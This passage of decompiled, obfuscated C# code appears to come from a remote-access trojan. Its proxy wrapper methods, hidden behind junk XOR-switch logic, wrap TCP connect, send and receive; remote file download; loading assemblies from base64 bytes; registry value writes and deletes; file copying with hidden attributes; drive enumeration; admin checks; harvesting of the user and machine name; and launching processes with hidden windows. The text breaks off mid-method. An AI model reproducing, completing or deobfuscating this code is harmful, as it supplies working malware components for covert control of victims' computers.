using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Configuration;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Policy;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Timers;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.VisualBasic.MyServices;
using Microsoft.Win32;

namespace ns0;

internal sealed class Class11
{
	internal sealed class Class12
	{
		internal sealed class Class13
		{
			internal string string_0;

			internal Class13()
			{
			}
		}

		[StructLayout(LayoutKind.Explicit, Pack = 1, Size = 78)]
		private struct Struct6
		{
		}

		internal sealed class Class14
		{
			internal static void smethod_0<T, U, V>(U gparam_0, V gparam_1, T gparam_2, int int_0, int int_1) where U : AppDomain where V : string
			{
				int num = 0;
				switch (((int_0 ^ int_1) - 71) ^ 0)
				{
				case 0:
					gparam_0.SetData(gparam_1, gparam_2);
					break;
				}
				num++;
			}

			internal static bool smethod_1<T>(T gparam_0, char char_0, int int_0) where T : string
			{
				int num = 0;
				bool result;
				int num2;
				do
				{
					result = (((int_0 ^ char_0) - 42) ^ num) switch
					{
						1 => Directory.Exists(gparam_0), 
						0 => File.Exists(gparam_0), 
						_ => false, 
					};
					num++;
					num2 = char_0 * char_0;
					num2 = char_0 + num2;
				}
				while (num2 % 2 != 0);
				return result;
			}

			internal static bool smethod_2<T>(T gparam_0, WindowsBuiltInRole windowsBuiltInRole_0, short short_0, char char_0) where T : WindowsPrincipal
			{
				int num = 0;
				bool result;
				do
				{
					result = (((char_0 ^ short_0) - 75) ^ num) switch
					{
						0 => gparam_0.IsInRole(windowsBuiltInRole_0), 
						_ => true, 
					};
					num++;
				}
				while ((char_0 * char_0 + char_0) % 2 != 0);
				return result;
			}

			internal static int smethod_3<T>(T gparam_0, short short_0, char char_0)
			{
				int num = 0;
				int result = (((char_0 ^ short_0) - 34) ^ 0) switch
				{
					0 => Conversions.ToInteger((object)gparam_0), 
					_ => 12, 
				};
				num++;
				return result;
			}

			internal static ComputerInfo smethod_4<T>(T gparam_0, int int_0, char char_0) where T : ServerComputer
			{
				int num = 0;
				ComputerInfo result = (ComputerInfo)((((int_0 ^ char_0) - 83) ^ 0) switch
				{
					0 => ((ServerComputer)gparam_0).get_Info(), 
					_ => null, 
				});
				num++;
				return result;
			}

			internal static Assembly smethod_5<T>(byte[] byte_0, byte[] byte_1, T gparam_0, char char_0, int int_0) where T : Evidence
			{
				//IL_0011: Unknown result type (might be due to invalid IL or missing references)
				//IL_0017: Expected O, but got Unknown
				int num = 0;
				Assembly result;
				do
				{
					result = (((int_0 ^ char_0) - 32) ^ num) switch
					{
						0 => (Assembly)(_Assembly)Assembly.Load(byte_0, byte_1, (Evidence)gparam_0), 
						_ => null, 
					};
					num++;
				}
				while ((char_0 * char_0 + char_0) % 2 != 0);
				return result;
			}

			internal static string smethod_6<T>(T gparam_0, int int_0, short short_0) where T : string
			{
				int num = 0;
				string result;
				int num2;
				do
				{
					result = (((int_0 ^ short_0) - 55) ^ num) switch
					{
						3 => (string)(IConvertible)Path.GetExtension(gparam_0), 
						2 => (string)(IConvertible)Path.GetFileName(gparam_0), 
						1 => (string)(IConvertible)Path.GetFileNameWithoutExtension(gparam_0), 
						0 => (string)(IConvertible)gparam_0.Trim(), 
						_ => null, 
					};
					num++;
					num2 = short_0 * short_0;
					num2 = short_0 + num2;
				}
				while (num2 % 2 != 0);
				return result;
			}

			internal static string smethod_7<T, U>(T gparam_0, U gparam_1, int int_0, short short_0) where T : WebClient where U : string
			{
				int num = 0;
				string result;
				do
				{
					result = (((int_0 ^ short_0) - 30) ^ num) switch
					{
						0 => gparam_0.DownloadString(gparam_1), 
						_ => null, 
					};
					num++;
				}
				while ((short_0 * short_0 + short_0) % 2 != 0);
				return result;
			}

			internal static void smethod_8<T, U>(T gparam_0, U gparam_1, char char_0, int int_0) where T : string where U : string
			{
				int num = 0;
				switch (((char_0 ^ int_0) - 2) ^ 0)
				{
				case 0:
					File.Copy(gparam_0, gparam_1);
					break;
				}
				num++;
			}

			internal static object smethod_9<T>(T gparam_0, short short_0, short short_1)
			{
				int num = 0;
				object result = (((short_1 ^ short_0) - 83) ^ 0) switch
				{
					0 => RuntimeHelpers.GetObjectValue(gparam_0), 
					_ => null, 
				};
				num++;
				return result;
			}

			internal static string smethod_10<T>(T gparam_0, int int_0, int int_1) where T : OperatingSystem
			{
				int num = 0;
				string result = (((int_1 ^ int_0) - 110) ^ 0) switch
				{
					0 => gparam_0.ServicePack, 
					_ => null, 
				};
				num++;
				return result;
			}

			internal static object smethod_11<T, U>(T gparam_0, U gparam_1, short short_0, int int_0) where U : Type
			{
				int num = 0;
				object result = (((int_0 ^ short_0) - 20) ^ 0) switch
				{
					0 => Conversions.ChangeType((object)gparam_0, (Type)gparam_1), 
					_ => null, 
				};
				num++;
				return result;
			}

			internal static string smethod_12<T>(T gparam_0, short short_0, int int_0) where T : StringBuilder
			{
				int num = 0;
				string result;
				do
				{
					result = (((short_0 ^ int_0) - 8) ^ num) switch
					{
						0 => (string)(IEnumerable)gparam_0.ToString(), 
						_ => null, 
					};
					num++;
				}
				while ((short_0 * short_0 + short_0) % 2 != 0);
				return result;
			}

			internal static void smethod_13<T, U>(U gparam_0, T gparam_1, int int_0, short short_0, char char_0) where T : string where U : TcpClient
			{
				int num = 0;
				do
				{
					switch (((short_0 ^ char_0) - 63) ^ num)
					{
					case 0:
						gparam_0.Connect(gparam_1, int_0);
						break;
					}
					num++;
				}
				while ((char_0 * char_0 + char_0) % 2 != 0);
			}

			internal static string[] smethod_14<T>(T gparam_0, char char_0, char char_1) where T : Assembly
			{
				int num = 0;
				string[] result;
				do
				{
					result = (((char_1 ^ char_0) - 103) ^ num) switch
					{
						0 => (string[])(Array)gparam_0.GetManifestResourceNames(), 
						_ => null, 
					};
					num++;
				}
				while ((char_1 * char_1 + char_1) % 2 != 0);
				return result;
			}

			internal static void smethod_15<T>(T gparam_0, FileAttributes fileAttributes_0, short short_0, int int_0) where T : string
			{
				int num = 0;
				switch (((short_0 ^ int_0) - 110) ^ 0)
				{
				case 0:
					File.SetAttributes(gparam_0, fileAttributes_0);
					break;
				}
				num++;
			}

			internal static OperatingSystem smethod_16(int int_0, int int_1)
			{
				int num = 0;
				OperatingSystem result = (((int_0 ^ int_1) - 53) ^ 0) switch
				{
					0 => Environment.OSVersion, 
					_ => null, 
				};
				num++;
				return result;
			}

			internal static IPAddress smethod_17<T>(T gparam_0, int int_0, int int_1) where T : string
			{
				int num = 0;
				IPAddress result = (((int_1 ^ int_0) - 34) ^ 0) switch
				{
					0 => IPAddress.Parse(gparam_0), 
					_ => null, 
				};
				num++;
				return result;
			}

			internal static int smethod_18<T, U>(T gparam_0, U gparam_1, CompareMethod compareMethod_0, short short_0, int int_0) where T : string where U : string
			{
				//IL_0024: Unknown result type (might be due to invalid IL or missing references)
				int num = 0;
				int result = (((short_0 ^ int_0) - 51) ^ 0) switch
				{
					0 => Strings.InStr((string)gparam_0, (string)gparam_1, compareMethod_0), 
					_ => 8, 
				};
				num++;
				return result;
			}

			internal static int smethod_19<T>(T gparam_0, int int_0, int int_1) where T : Socket
			{
				int num = 0;
				int result = (((int_0 ^ int_1) - 25) ^ 0) switch
				{
					0 => gparam_0.Available, 
					_ => int_0, 
				};
				num++;
				return result;
			}

			internal static RegistryProxy smethod_20<T>(T gparam_0, short short_0, int int_0) where T : ServerComputer
			{
				int num = 0;
				RegistryProxy result = (RegistryProxy)((((short_0 ^ int_0) - 47) ^ 0) switch
				{
					0 => ((ServerComputer)gparam_0).get_Registry(), 
					_ => null, 
				});
				num++;
				return result;
			}

			internal static string smethod_21<T, U, V>(U gparam_0, V gparam_1, T gparam_2, int int_0, char char_0) where T : string where U : string where V : string
			{
				int num = 0;
				string result;
				do
				{
					result = (((char_0 ^ int_0) - 71) ^ num) switch
					{
						1 => (string)(IConvertible)gparam_0.Replace(gparam_1, gparam_2), 
						0 => (string)(IConvertible)string.Concat(gparam_0, gparam_1, gparam_2), 
						_ => null, 
					};
					num++;
				}
				while ((char_0 * char_0 + char_0) % 2 != 0);
				return result;
			}

			internal static int smethod_22<T>(T gparam_0, int int_0, int int_1, int int_2, char char_0) where T : Random
			{
				int num = 0;
				int result;
				do
				{
					result = (((char_0 ^ int_2) - 124) ^ num) switch
					{
						0 => gparam_0.Next(int_0, int_1), 
						_ => 12, 
					};
					num++;
				}
				while ((char_0 * char_0 + char_0) % 2 != 0);
				return result;
			}

			internal static DriveInfo[] smethod_23(int int_0, short short_0)
			{
				int num = 0;
				DriveInfo[] result;
				int num2;
				do
				{
					result = (((short_0 ^ int_0) - 100) ^ num) switch
					{
						0 => (DriveInfo[])(Array)DriveInfo.GetDrives(), 
						_ => null, 
					};
					num++;
					num2 = short_0 * short_0;
					num2 = short_0 + num2;
				}
				while (num2 % 2 != 0);
				return result;
			}
		}

		private static readonly object object_0;

		private static readonly Array array_0;

		private static readonly Array array_1;

		internal static byte byte_0/* Not supported: data(00) */;

		internal static AppDomain smethod_0(int int_0, short short_0)
		{
			//IL_0009: Unknown result type (might be due to invalid IL or missing references)
			//IL_000f: Expected O, but got Unknown
			int num = 0;
			AppDomain result;
			do
			{
				result = (((int_0 ^ short_0) - 91) ^ num) switch
				{
					0 => (AppDomain)(_AppDomain)AppDomain.CurrentDomain, 
					_ => null, 
				};
				num++;
			}
			while ((short_0 * short_0 + short_0) % 2 != 0);
			return result;
		}

		internal static void smethod_1<T>(T gparam_0, int int_0, short short_0) where T : Exception
		{
			int num = 0;
			switch (((int_0 ^ short_0) - 29) ^ 0)
			{
			case 0:
				ProjectData.SetProjectError((Exception)gparam_0);
				break;
			}
			num++;
		}

		internal static object smethod_2<T, U>(bool bool_0, T gparam_0, U gparam_1, int int_0, short short_0)
		{
			int num = 0;
			object result;
			do
			{
				result = (((int_0 ^ short_0) - 74) ^ num) switch
				{
					0 => Interaction.IIf(bool_0, (object)gparam_0, (object)gparam_1), 
					_ => null, 
				};
				num++;
			}
			while ((short_0 * short_0 + short_0) % 2 != 0);
			return result;
		}

		internal static Process smethod_3<T>(T gparam_0, int int_0, char char_0) where T : string
		{
			int num = 0;
			Process result;
			do
			{
				result = (((int_0 ^ char_0) - 47) ^ num) switch
				{
					0 => (Process)(Component)Process.Start(gparam_0), 
					_ => null, 
				};
				num++;
			}
			while ((char_0 * char_0 + char_0) % 2 != 0);
			return result;
		}

		internal static byte[] smethod_4<T>(T gparam_0, int int_0, short short_0) where T : string
		{
			int num = 0;
			byte[] result = (((short_0 ^ int_0) - 76) ^ 0) switch
			{
				0 => Convert.FromBase64String(gparam_0), 
				_ => null, 
			};
			num++;
			return result;
		}

		internal static void smethod_5<T, U, V>(U gparam_0, T gparam_1, V gparam_2, short short_0, int int_0) where T : string where U : RegistryKey
		{
			int num = 0;
			do
			{
				switch (((int_0 ^ short_0) - 51) ^ num)
				{
				case 0:
					gparam_0.SetValue(gparam_1, gparam_2);
					break;
				}
				num++;
			}
			while ((short_0 * short_0 + short_0) % 2 != 0);
		}

		internal static double smethod_6<T>(T gparam_0, int int_0, short short_0) where T : string
		{
			int num = 0;
			double result = (((int_0 ^ short_0) - 96) ^ 0) switch
			{
				0 => Conversions.ToDouble((string)gparam_0), 
				_ => 1.3505038089018406, 
			};
			num++;
			return result;
		}

		internal static WindowsIdentity smethod_7(short short_0, int int_0)
		{
			int num = 0;
			WindowsIdentity result = (((short_0 ^ int_0) - 89) ^ 0) switch
			{
				0 => WindowsIdentity.GetCurrent(), 
				_ => null, 
			};
			num++;
			return result;
		}

		internal static void smethod_8<T>(T gparam_0, double double_0, char char_0, char char_1) where T : System.Timers.Timer
		{
			int num = 0;
			do
			{
				switch (((char_0 ^ char_1) - 124) ^ num)
				{
				case 0:
					gparam_0.Interval = double_0;
					break;
				}
				num++;
			}
			while ((char_1 * char_1 + char_1) % 2 != 0);
		}

		internal static byte[] smethod_9<T, U>(T gparam_0, U gparam_1, char char_0, int int_0) where T : Encoding where U : string
		{
			int num = 0;
			byte[] result = (((int_0 ^ char_0) - 75) ^ 0) switch
			{
				0 => gparam_0.GetBytes(gparam_1), 
				_ => null, 
			};
			num++;
			return result;
		}

		internal static Process smethod_10<T>(T gparam_0, int int_0, char char_0) where T : ProcessStartInfo
		{
			int num = 0;
			Process result = (((char_0 ^ int_0) - 40) ^ 0) switch
			{
				0 => Process.Start(gparam_0), 
				_ => null, 
			};
			num++;
			return result;
		}

		internal static object smethod_11<T, U>(T gparam_0, U gparam_1, short short_0, short short_1) where T : string where U : string
		{
			int num = 0;
			object result;
			do
			{
				result = (((short_0 ^ short_1) - 39) ^ num) switch
				{
					0 => Interaction.CreateObject((string)gparam_0, (string)gparam_1), 
					_ => null, 
				};
				num++;
			}
			while ((short_0 * short_0 + short_0) % 2 != 0);
			return result;
		}

		internal static void smethod_12<T, U, V>(T gparam_0, V gparam_1, U gparam_2, object[] object_1, string[] string_0, Type[] type_0, int int_0, int int_1) where U : string where V : Type
		{
			int num = 0;
			switch (((int_1 ^ int_0) - 113) ^ 0)
			{
			case 0:
				NewLateBinding.LateSet((object)gparam_0, (Type)gparam_1, (string)gparam_2, object_1, string_0, type_0);
				break;
			}
			num++;
		}

		internal static void smethod_13<T>(T gparam_0, short short_0, char char_0) where T : Stream
		{
			int num = 0;
			switch (((short_0 ^ char_0) - 45) ^ 0)
			{
			case 0:
				gparam_0.Dispose();
				break;
			}
			num++;
		}

		internal static DriveType smethod_14<T>(T gparam_0, char char_0, int int_0) where T : DriveInfo
		{
			int num = 0;
			DriveType result;
			int num2;
			do
			{
				result = (((int_0 ^ char_0) - 63) ^ num) switch
				{
					0 => gparam_0.DriveType, 
					_ => DriveType.Unknown, 
				};
				num++;
				num2 = char_0 * char_0;
				num2 = char_0 + num2;
			}
			while (num2 % 2 != 0);
			return result;
		}

		internal static string smethod_15(Environment.SpecialFolder specialFolder_0, char char_0, char char_1)
		{
			int num = 0;
			string result = (((char_1 ^ char_0) - 75) ^ 0) switch
			{
				0 => (string)(IEnumerable)Environment.GetFolderPath(specialFolder_0), 
				_ => null, 
			};
			num++;
			return result;
		}

		internal static void smethod_16<T, U, V>(T gparam_0, V gparam_1, U gparam_2, char char_0, short short_0) where T : WebClient where U : string where V : string
		{
			int num = 0;
			int num2;
			do
			{
				switch (((short_0 ^ char_0) - 117) ^ num)
				{
				case 0:
					gparam_0.DownloadFile(gparam_1, gparam_2);
					break;
				}
				num++;
				num2 = short_0 * short_0;
				num2 = short_0 + num2;
			}
			while (num2 % 2 != 0);
		}

		internal static ManagementObjectEnumerator smethod_17<T>(T gparam_0, short short_0, int int_0) where T : ManagementObjectCollection
		{
			int num = 0;
			ManagementObjectEnumerator result;
			int num2;
			do
			{
				result = (ManagementObjectEnumerator)((((short_0 ^ int_0) - 99) ^ num) switch
				{
					0 => ((ManagementObjectCollection)gparam_0).GetEnumerator(), 
					_ => null, 
				});
				num++;
				num2 = short_0 * short_0;
				num2 = short_0 + num2;
			}
			while (num2 % 2 != 0);
			return result;
		}

		static Class12()
		{
			array_0 = new char[39];
			char[] array = new char[8];
			array[4] = '⺈';
			array[6] = '◑';
			array[3] = '\u1fcf';
			array[0] = '≪';
			array[7] = 'ᓦ';
			array[5] = '۽';
			array[1] = 'Ꭱ';
			array[2] = 'ٳ';
			array_1 = new string[1];
			object_0 = array;
		}
	}

	internal sealed class Class15
	{
		internal static void smethod_0<T, U>(T gparam_0, U gparam_1, char char_0, char char_1) where T : AppDomain where U : ResolveEventHandler
		{
			int num = 0;
			switch (((char_1 ^ char_0) - 50) ^ 0)
			{
			case 0:
				gparam_0.ResourceResolve += gparam_1;
				break;
			}
			num++;
		}

		internal static Delegate smethod_1<T, U>(T gparam_0, U gparam_1, char char_0, int int_0) where T : Delegate where U : Delegate
		{
			int num = 0;
			Delegate result;
			int num2;
			do
			{
				result = (((int_0 ^ char_0) - 59) ^ num) switch
				{
					1 => Delegate.Remove(gparam_0, gparam_1), 
					0 => Delegate.Combine(gparam_0, gparam_1), 
					_ => null, 
				};
				num++;
				num2 = char_0 * char_0;
				num2 = char_0 + num2;
			}
			while (num2 % 2 != 0);
			return result;
		}

		internal static SettingsBase smethod_2<T>(T gparam_0, short short_0, short short_1) where T : SettingsBase
		{
			int num = 0;
			SettingsBase result;
			int num2;
			do
			{
				result = (SettingsBase)((((short_0 ^ short_1) - 124) ^ num) switch
				{
					0 => SettingsBase.Synchronized((SettingsBase)(object)gparam_0), 
					_ => null, 
				});
				num++;
				num2 = short_0 * short_0;
				num2 = short_0 + num2;
			}
			while (num2 % 2 != 0);
			return result;
		}

		internal static bool smethod_3<T>(T gparam_0, char char_0, short short_0) where T : WeakReference
		{
			int num = 0;
			bool result;
			int num2;
			do
			{
				result = (((char_0 ^ short_0) - 91) ^ num) switch
				{
					0 => gparam_0.IsAlive, 
					_ => false, 
				};
				num++;
				num2 = short_0 * short_0;
				num2 = short_0 + num2;
			}
			while (num2 % 2 != 0);
			return result;
		}

		internal static void smethod_4<T>(T gparam_0, byte[] byte_0, int int_0, int int_1, char char_0, short short_0) where T : MemoryStream
		{
			int num = 0;
			switch (((char_0 ^ short_0) - 34) ^ 0)
			{
			case 0:
				gparam_0.Write(byte_0, int_0, int_1);
				break;
			}
			num++;
		}

		internal static bool smethod_5<T, U>(T gparam_0, U gparam_1, char char_0, char char_1)
		{
			int num = 0;
			bool result;
			int num2;
			do
			{
				result = (((char_0 ^ char_1) - 47) ^ num) switch
				{
					0 => object.ReferenceEquals(gparam_0, gparam_1), 
					_ => false, 
				};
				num++;
				num2 = char_0 * char_0;
				num2 = char_0 + num2;
			}
			while (num2 % 2 != 0);
			return result;
		}

		internal static Socket smethod_6<T>(T gparam_0, int int_0, char char_0) where T : TcpClient
		{
			int num = 0;
			Socket result = (((int_0 ^ char_0) - 11) ^ 0) switch
			{
				0 => gparam_0.Client, 
				_ => null, 
			};
			num++;
			return result;
		}

		internal static long smethod_7<T>(T gparam_0, char char_0, int int_0) where T : MemoryStream
		{
			int num = 0;
			long result = (((int_0 ^ char_0) - 102) ^ 0) switch
			{
				0 => gparam_0.Length, 
				_ => 2L, 
			};
			num++;
			return result;
		}

		internal static int smethod_8<T>(T gparam_0, int int_0, short short_0) where T : TcpClient
		{
			int num = 0;
			int result = (((short_0 ^ int_0) - 60) ^ 0) switch
			{
				0 => gparam_0.Available, 
				_ => 13, 
			};
			num++;
			return result;
		}

		internal static string smethod_9(int int_0, char char_0)
		{
			int num = 0;
			string result = (((int_0 ^ char_0) - 53) ^ 0) switch
			{
				0 => (string)(ICloneable)Application.get_ExecutablePath(), 
				1 => (string)(ICloneable)Interaction.Command(), 
				2 => (string)(ICloneable)Environment.UserName, 
				3 => (string)(ICloneable)Environment.MachineName, 
				4 => (string)(ICloneable)Path.GetTempPath(), 
				_ => null, 
			};
			num++;
			return result;
		}

		internal static void smethod_10<T>(T gparam_0, char char_0, char char_1) where T : Component
		{
			int num = 0;
			do
			{
				switch (((char_1 ^ char_0) - 48) ^ num)
				{
				case 0:
					gparam_0.Dispose();
					break;
				}
				num++;
			}
			while ((char_1 * char_1 + char_1) % 2 != 0);
		}

		internal static void smethod_11<T>(T gparam_0, byte[] byte_0, char char_0, int int_0) where T : string
		{
			int num = 0;
			do
			{
				switch (((int_0 ^ char_0) - 26) ^ num)
				{
				case 0:
					File.WriteAllBytes(gparam_0, byte_0);
					break;
				}
				num++;
			}
			while ((char_0 * char_0 + char_0) % 2 != 0);
		}

		internal static void smethod_12<T>(T gparam_0, int int_0, char char_0) where T : StreamWriter
		{
			int num = 0;
			switch (((char_0 ^ int_0) - 11) ^ 0)
			{
			case 0:
				gparam_0.Close();
				break;
			}
			num++;
		}

		internal static void smethod_13<T>(T gparam_0, ProcessWindowStyle processWindowStyle_0, short short_0, char char_0) where T : ProcessStartInfo
		{
			int num = 0;
			do
			{
				switch (((short_0 ^ char_0) - 112) ^ num)
				{
				case 0:
					gparam_0.WindowStyle = processWindowStyle_0;
					break;
				}
				num++;
			}
			while ((short_0 * short_0 + short_0) % 2 != 0);
		}

		internal static void smethod_14<T, U, V>(V gparam_0, T gparam_1, U gparam_2, object[] object_0, string[] string_0, Type[] type_0, bool bool_0, bool bool_1, char char_0, short short_0) where T : Type where U : string
		{
			int num = 0;
			switch (((short_0 ^ char_0) - 101) ^ 0)
			{
			case 0:
				NewLateBinding.LateSetComplex((object)gparam_0, (Type)gparam_1, (string)gparam_2, object_0, string_0, type_0, bool_0, bool_1);
				break;
			}
			num++;
		}

		internal static int smethod_15<T>(T gparam_0, int int_0, char char_0, short short_0) where T : Array
		{
			int num = 0;
			int result;
			int num2;
			do
			{
				result = (((short_0 ^ char_0) - 5) ^ num) switch
				{
					0 => Information.UBound((Array)gparam_0, int_0), 
					_ => int_0, 
				};
				num++;
				num2 = char_0 * char_0;
				num2 = char_0 + num2;
			}
			while (num2 % 2 != 0);
			return result;
		}

		internal static object smethod_16<T, U>(T gparam_0, U gparam_1, short short_0, char char_0)
		{
			int num = 0;
			object result;
			do
			{
				result = (((char_0 ^ short_0) - 22) ^ num) switch
				{
					0 => Operators.ConcatenateObject((object)gparam_0, (object)gparam_1), 
					_ => null, 
				};
				num++;
			}
			while ((short_0 * short_0 + short_0) % 2 != 0);
			return result;
		}

		internal static bool smethod_17<T>(T gparam_0, int int_0, char char_0) where T : Socket
		{
			int num = 0;
			bool result;
			int num2;
			do
			{
				result = (((int_0 ^ char_0) - 83) ^ num) switch
				{
					0 => gparam_0.Connected, 
					_ => false, 
				};
				num++;
				num2 = char_0 * char_0;
				num2 = char_0 + num2;
			}
			while (num2 % 2 != 0);
			return result;
		}

		internal static int smethod_18<T>(T gparam_0, int int_0, int int_1) where T : Array
		{
			int num = 0;
			int result = (((int_1 ^ int_0) - 78) ^ 0) switch
			{
				0 => gparam_0.Length, 
				_ => int_0, 
			};
			num++;
			return result;
		}

		internal static string smethod_19<T, U, V, W>(V gparam_0, W gparam_1, T gparam_2, U gparam_3, short short_0, char char_0) where T : string where U : string where V : string where W : string
		{
			int num = 0;
			string result = (((char_0 ^ short_0) - 56) ^ 0) switch
			{
				0 => (string)(IEquatable<string>)string.Concat(gparam_0, gparam_1, gparam_2, gparam_3), 
				_ => null, 
			};
			num++;
			return result;
		}

		internal static void smethod_20<T>(T gparam_0, int int_0, int int_1) where T : Socket
		{
			int num = 0;
			switch (((int_0 ^ int_1) - 39) ^ 0)
			{
			case 0:
				gparam_0.Close();
				break;
			}
			num++;
		}

		internal static void smethod_21<T, U>(T gparam_0, U gparam_1, short short_0, char char_0) where T : TextWriter where U : string
		{
			int num = 0;
			switch (((short_0 ^ char_0) - 23) ^ 0)
			{
			case 0:
				gparam_0.WriteLine(gparam_1);
				break;
			}
			num++;
		}

		internal static MsgBoxResult smethod_22<T, U>(U gparam_0, MsgBoxStyle msgBoxStyle_0, T gparam_1, short short_0, char char_0)
		{
			//IL_000a: Unknown result type (might be due to invalid IL or missing references)
			//IL_0011: Unknown result type (might be due to invalid IL or missing references)
			//IL_0016: Unknown result type (might be due to invalid IL or missing references)
			//IL_0029: Unknown result type (might be due to invalid IL or missing references)
			//IL_003f: Unknown result type (might be due to invalid IL or missing references)
			int num = 0;
			MsgBoxResult result;
			do
			{
				result = (MsgBoxResult)((((short_0 ^ char_0) - 2) ^ num) switch
				{
					0 => Interaction.MsgBox((object)gparam_0, msgBoxStyle_0, (object)gparam_1), 
					_ => 0, 
				});
				num++;
			}
			while ((char_0 * char_0 + char_0) % 2 != 0);
			return result;
		}

		internal static RegistryKey smethod_23<T, U>(U gparam_0, T gparam_1, bool bool_0, short short_0, int int_0) where T : string where U : RegistryKey
		{
			int num = 0;
			RegistryKey result;
			int num2;
			do
			{
				result = (((short_0 ^ int_0) - 59) ^ num) switch
				{
					0 => (RegistryKey)(MarshalByRefObject)gparam_0.OpenSubKey(gparam_1, bool_0), 
					_ => null, 
				};
				num++;
				num2 = short_0 * short_0;
				num2 = short_0 + num2;
			}
			while (num2 % 2 != 0);
			return result;
		}

		internal static int smethod_24<T>(T gparam_0, AppWinStyle appWinStyle_0, bool bool_0, int int_0, char char_0, char char_1) where T : string
		{
			//IL_001f: Unknown result type (might be due to invalid IL or missing references)
			int num = 0;
			int result = (((char_0 ^ char_1) - 25) ^ 0) switch
			{
				0 => Interaction.Shell((string)gparam_0, appWinStyle_0, bool_0, int_0), 
				_ => 8, 
			};
			num++;
			return result;
		}

		internal static Encoding smethod_25(int int_0, int int_1)
		{
			int num = 0;
			Encoding result = (((int_0 ^ int_1) - 58) ^ 0) switch
			{
				0 => (Encoding)(ICloneable)Encoding.Default, 
				_ => null, 
			};
			num++;
			return result;
		}
	}

	internal static void smethod_0<T>(T gparam_0, int int_0, int int_1)
	{
		int num = 0;
		switch (((int_1 ^ int_0) - 104) ^ 0)
		{
		case 0:
			Monitor.Enter(gparam_0);
			break;
		case 1:
			Monitor.Exit(gparam_0);
			break;
		}
		num++;
	}

	internal static object smethod_1<T, U>(U gparam_0, T gparam_1, int int_0, char char_0) where T : string where U : AppDomain
	{
		int num = 0;
		object result = (((char_0 ^ int_0) - 50) ^ 0) switch
		{
			0 => gparam_0.GetData(gparam_1), 
			_ => null, 
		};
		num++;
		return result;
	}

	internal static void smethod_2(char char_0, char char_1)
	{
		int num = 0;
		switch (((char_1 ^ char_0) - 30) ^ 0)
		{
		case 0:
			ProjectData.ClearProjectError();
			break;
		case 1:
			ProjectData.EndApp();
			break;
		case 2:
			Application.Restart();
			break;
		}
		num++;
	}

	internal static string smethod_3<T>(T gparam_0, int int_0, int int_1)
	{
		int num = 0;
		string result = (((int_0 ^ int_1) - 92) ^ 0) switch
		{
			0 => (string)(IEnumerable<char>)gparam_0.ToString(), 
			1 => (string)(IEnumerable<char>)Conversions.ToString((object)gparam_0), 
			_ => null, 
		};
		num++;
		return result;
	}

	internal static int smethod_4<T>(T gparam_0, byte[] byte_0, int int_0, int int_1, SocketFlags socketFlags_0, int int_2, int int_3) where T : Socket
	{
		int num = 0;
		int result = (((int_2 ^ int_3) - 117) ^ 0) switch
		{
			0 => gparam_0.Send(byte_0, int_0, int_1, socketFlags_0), 
			1 => gparam_0.Receive(byte_0, int_0, int_1, socketFlags_0), 
			_ => 9, 
		};
		num++;
		return result;
	}

	internal static int smethod_5<T>(T gparam_0, byte[] byte_0, int int_0, int int_1, short short_0, short short_1) where T : Stream
	{
		int num = 0;
		int result = (((short_0 ^ short_1) - 55) ^ 0) switch
		{
			0 => gparam_0.Read(byte_0, int_0, int_1), 
			_ => 11, 
		};
		num++;
		return result;
	}

	internal static RegistryKey smethod_6<T>(T gparam_0, short short_0, int int_0) where T : RegistryProxy
	{
		int num = 0;
		RegistryKey result = (((short_0 ^ int_0) - 18) ^ 0) switch
		{
			0 => ((RegistryProxy)gparam_0).get_CurrentUser(), 
			_ => null, 
		};
		num++;
		return result;
	}

	internal static object smethod_7<T, U, V>(T gparam_0, V gparam_1, U gparam_2, object[] object_0, string[] string_0, Type[] type_0, bool[] bool_0, char char_0, char char_1) where U : string where V : Type
	{
		int num = 0;
		object result = (((char_0 ^ char_1) - 124) ^ 0) switch
		{
			0 => NewLateBinding.LateGet((object)gparam_0, (Type)gparam_1, (string)gparam_2, object_0, string_0, type_0, bool_0), 
			_ => null, 
		};
		num++;
		return result;
	}

	internal static Evidence smethod_8<T>(T gparam_0, int int_0, int int_1) where T : Assembly
	{
		int num = 0;
		Evidence result = (((int_1 ^ int_0) - 74) ^ 0) switch
		{
			0 => (Evidence)(ICollection)((Assembly)gparam_0).get_Evidence(), 
			_ => null, 
		};
		num++;
		return result;
	}

	internal static string[] smethod_9<T>(T gparam_0, char[] char_0, short short_0, int int_0) where T : string
	{
		int num = 0;
		string[] result = (((short_0 ^ int_0) - 100) ^ 0) switch
		{
			0 => (string[])(Array)gparam_0.Split(char_0), 
			_ => null, 
		};
		num++;
		return result;
	}

	internal static void smethod_10<T, U>(U gparam_0, T gparam_1, bool bool_0, short short_0, int int_0) where T : string where U : RegistryKey
	{
		int num = 0;
		int num2;
		do
		{
			switch (((short_0 ^ int_0) - 17) ^ num)
			{
			case 0:
				gparam_0.DeleteValue(gparam_1, bool_0);
				break;
			}
			num++;
			num2 = short_0 * short_0;
			num2 = short_0 + num2;
		}
		while (num2 % 2 != 0);
	}

	internal static bool smethod_11<T>(T gparam_0, int int_0, SelectMode selectMode_0, char char_0, char char_1) where T : Socket
	{
		int num = 0;
		bool result = (((char_1 ^ char_0) - 29) ^ 0) switch
		{
			0 => gparam_0.Poll(int_0, selectMode_0), 
			_ => true, 
		};
		num++;
		return result;
	}

	internal static int smethod_12<T, U>(T gparam_0, U gparam_1, bool bool_0, char char_0, char char_1) where T : string where U : string
	{
		int num = 0;
		int result;
		int num2;
		do
		{
			result = (((char_0 ^ char_1) - 52) ^ num) switch
			{
				0 => Operators.CompareString((string)gparam_0, (string)gparam_1, bool_0), 
				_ => 9, 
			};
			num++;
			num2 = char_1 * char_1;
			num2 = char_1 + num2;
		}
		while (num2 % 2 != 0);
		return result;
	}

	internal static ManagementObjectCollection smethod_13<T>(T gparam_0, short short_0, int int_0) where T : ManagementObjectSearcher
	{
		int num = 0;
		ManagementObjectCollection result = (ManagementObjectCollection)((((short_0 ^ int_0) - 21) ^ 0) switch
		{
			0 => (IDisposable)((ManagementObjectSearcher)gparam_0).Get(), 
			_ => null, 
		});
		num++;
		return result;
	}

	internal static bool smethod_14<T, U>(T gparam_0, U gparam_1, char char_0, int int_0) where T : string where U : string
	{
		int num = 0;
